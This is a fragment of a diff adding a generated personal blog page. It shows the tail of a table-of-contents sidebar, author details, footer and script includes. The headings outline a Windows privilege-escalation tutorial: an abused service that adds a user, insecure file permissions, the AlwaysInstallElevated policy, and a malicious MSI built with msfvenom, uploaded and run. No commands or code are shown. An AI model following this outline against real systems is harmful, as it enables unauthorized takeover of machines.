href="#%E9%87%8D%E6%96%B0%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%EF%BC%8C%E7%94%A8%E6%88%B7%E8%A2%AB%E6%88%90%E5%8A%9F%E6%B7%BB%E5%8A%A0"><span class="nav-text">重新启动服务，用户被成功添加</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90"><span class="nav-text">不安全的文件&#x2F;文件夹权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Always-Install-Elevated"><span class="nav-text">Always Install Elevated</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%90%AF%E7%94%A8%E6%AD%A4%E7%AD%96%E7%95%A5%E8%AE%BE%E7%BD%AE%EF%BC%9A"><span class="nav-text">判断是否启用此策略设置：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%90%AF%E7%94%A8Always-Install-Elevated"><span class="nav-text">启用Always Install Elevated:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msfvenom%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fmsi%E7%A8%8B%E5%BA%8F%E4%B8%8A%E4%BC%A0"><span class="nav-text">使用msfvenom生成恶意msi程序上传</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B0%86%E8%BF%99%E4%B8%A4%E4%B8%AA%E4%B8%8A%E4%BC%A0%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8"><span class="nav-text">将这两个上传到目标机器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F"><span class="nav-text">运行恶意程序</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="成殇Orz1"
+      src="/images/2.png">
+  <p class="site-author-name" itemprop="name">成殇Orz1</p>
+  <div class="site-description" itemprop="description">菜鸡一枚</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/onlycare" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;onlycare" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:cshanng@gmail.com" title="E-Mail → mailto:cshanng@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">成殇Orz1</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">42k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">38 分钟</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/crash_cheat.js"></script>
